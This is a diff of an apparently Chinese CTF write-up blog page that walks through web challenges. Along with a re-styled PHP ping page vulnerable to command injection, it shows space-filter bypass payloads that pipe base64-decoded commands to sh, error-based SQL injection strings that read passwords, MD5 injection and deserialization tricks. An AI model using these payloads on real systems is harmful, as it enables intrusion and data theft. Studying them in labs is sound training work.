@@ -645,11 +645,11 @@ handler 指向RequestHandler
 <p><code>payload：?filename=/fllllllllllllag&amp;filehash=1146a9399145b2294ef06246c63ed2c1</code></p>
 <p><img src="https://i.loli.net/2020/07/15/eTA2iC4OuhG9jKm.png" alt="22.png"></p>
 <h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>进入页面提示一起来撸猫，其余没有啥东西，然后查看源代码,注释里有这么一段代码</p>
-<pre><code>$cat=$_GET[&#39;cat&#39;];
-echo $cat;
-if($cat==&#39;dog&#39;)&#123;
-   echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;
-&#125;</code></pre>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string">'dog'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+   <span class="token keyword">echo</span> <span class="token string">'Syc&amp;#123;cat_cat_cat_cat&amp;#125;'</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>直接输入<code>cat=dog</code>，就得到了flag</p>
 <h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id="方法１"><a href="#方法１" class="headerlink" title="方法１"></a>方法１</h3><p>首页是个计算器？右击查看源代码</p>
 <p><img src="https://i.loli.net/2020/07/17/NyrRbM4csTaJtAv.png" alt="24.png"></p>
@@ -702,25 +702,25 @@ if($cat==&#39;dog&#39;)&#123;
 <p>再用上面那条命令<code>127.0.0.1　%7c%7c cat flag.php</code>发现空格被过滤了</p>
 <p>空格可以使用<code>$IFS $&#123;IFS&#125; $IFS$1</code>绕过，但是还是不能读取<code>flag.php</code>,读取一点<code>index.php</code></p>
 <p>index.php</p>
-<pre><code>&lt;?php
-if(isset($_GET[&#39;ip&#39;]))&#123;
-  $ip = $_GET[&#39;ip&#39;];
-  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
-    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
-    die(&quot;fxck your symbol!&quot;);
-  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
-    die(&quot;fxck your space!&quot;);
-  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
-    die(&quot;fxck your bash!&quot;);
-  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
-    die(&quot;fxck your flag!&quot;);
-  &#125;
-  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
-  echo &quot;&lt;pre&gt;&quot;;
-  print_r($a);
-&#125;
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+  <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\&amp;|\/|\?|\*|\&lt;|[\x&amp;#123;00&amp;#125;-\x&amp;#123;1f&amp;#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&amp;#123;|\&amp;#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\&amp;|\/|\?|\*|\&lt;|[\x&amp;#123;00&amp;#125;-\x&amp;#123;20&amp;#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&amp;#123;|\&amp;#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else if(preg_match(</span><span class="token string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">"ping -c 4 "</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string">"&lt;pre>"</span><span class="token punctuation">;</span>
+  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
 
-?&gt;</code></pre>
+<span class="token delimiter">?></span></code></pre>
 <h3 id="这题去看有好多解法："><a href="#这题去看有好多解法：" class="headerlink" title="这题去看有好多解法："></a>这题去看有好多解法：</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>因为过滤了<code>flag和hash</code>，但是<code>sh</code>没有过滤</p>
 <p>payload：<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
 <h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>payload：cat$IFS$1`ls`</p>
@@ -846,7 +846,7 @@ html <span class="token operator">=</span> requests<span class="token punctuatio
 <p>通过POST传递money和password，password不能是数字但是还要等于404,is_number函数是可以用<code>%20</code>绕过的，用burp抓包的时候发现一个Cookie字段的user的值是０，这个地方要改成１，money的值是100000000，但是这里告诉我们太长了，可以使用<code>1e9</code>代替，就能拿到flag</p>
 <p><img src="https://i.loli.net/2020/08/09/pDSxryIbLBOTzi9.png" alt="56.png"></p>
 <h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>用burp抓包之后看到提示</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/CTF/yheGwWxnCJ35Lm1.png" alt="63.png"></p>
+<p><img src="https://i.loli.net/2021/10/14/J9UlszyVo6eXMf2.png" alt="63.png"></p>
 <p>这个时候传入<code>ffifdyop</code>，得到一个地址<code>window.location.replace(&#39;./levels91.php&#39;)</code>，访问levels91.php，得到一段代码</p>
 <pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -967,9 +967,9 @@ __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按
 <pre class=" language-php"><code class="language-php"><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>columns<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string">'H4rDsq1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
 <span class="token number">1</span>'<span class="token operator">^</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span>
 <span class="token number">1</span>'<span class="token operator">^</span><span class="token function">extractvalue</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>geek<span class="token punctuation">.</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span></code></pre>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/CTF/LOHAWFS6hGpQElK.png" alt="75.png"></p>
+<p><img src="https://i.loli.net/2021/10/14/1tNERdz648sVUpX.png" alt="75.png"></p>
 <p>只能看到一部分，这是因为updatexml的最大长度是32位的，所以有所局限，所以我们要读取后半部分，用left和right读取后半部分</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/CTF/U1imqxRtZeYOhSu.png" alt="76.png"></p>
+<p><img src="https://i.loli.net/2021/10/14/X1g3M52PIpCeylT.png" alt="76.png"></p>
 <h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p>一个登录页面，在用户名和密码的地方输入<code>｀</code>，并没有发生报错什么的，查看网页源代码也没有什么东西，用burp抓包看一下，在相应包里有一个<code>L0g1n.php</code>，访问一下，</p>
 <ul>
 <li>相应包里面有个<code>Sorry, this site will be available after totally 99 years!</code>，请求包里面有个time字段，给他变成很大比如10000000000</li>
@@ -979,7 +979,7 @@ __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按
 <li>修改请求头的User-Agent：<code>Commodo 64</code>，响应包<code>no no no i think it is not the real commmodo 64, &lt;br&gt;what is the real ua for Commdo?</code>,最后改成Commodore 64就可以了，响应包<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></li>
 <li>请求头添加<code>From:root@gem-love.com</code>，响应包<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code>，</li>
 </ul>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/CTF/G2dPzkiEJgMsDWu.png" alt="78.png"></p>
+<p><img src="https://i.loli.net/2021/10/14/1G2ISWuTnjBhy37.png" alt="78.png"></p>
 <h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
 <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -1063,7 +1063,7 @@ __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按
 <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
 <p>PHP反序列化漏洞，在反序列话的过程中，会调用<code>__destruct</code>析构方法，因为我们最后要调用<code>read()</code>方法去读取flag，在<code>process()</code>方法中令<code>op</code>== 2，就会调用<code>read()</code>，但是析构方法中<code>op === &quot;2&quot;</code>，如果等于２，会重新赋值为１，但是因为这里是强比较，可以用弱类型绕过</p>
 <p><code>$op,$filename,$content</code>受保护的，protected权限的变量在序列化的时会有<code>%00*%00</code>字符，但是is_valid()函数进行检测是否合法，函数限制只能出现ascii值在32-125之间的字符，而protected类型序列化出现的%00标识被url解码后ascii值为0，会被检测到，但是因为php7.1+对类属性的检测不严格，所以可以直接用public来进行序列化</p>
-<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/CTF/PSFnf29ohyNcOm8.png" alt="79.png"></p>
+<p><img src="https://i.loli.net/2021/10/14/YpykiOoGgZHvDwW.png" alt="79.png"></p>
 <p>查看源代码就可以看到flag</p>
 <h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>文件上传，这里不能上传<code>php</code>文件，但是能上传<code>jpg</code>，所以可以试一下先上传<code>.htaccess</code>文件再上传<code>jpg</code>文件</p>
 <p><img src="https://i.loli.net/2020/12/27/nz86qaBtgjdpWry.png" alt="82.png"></p>
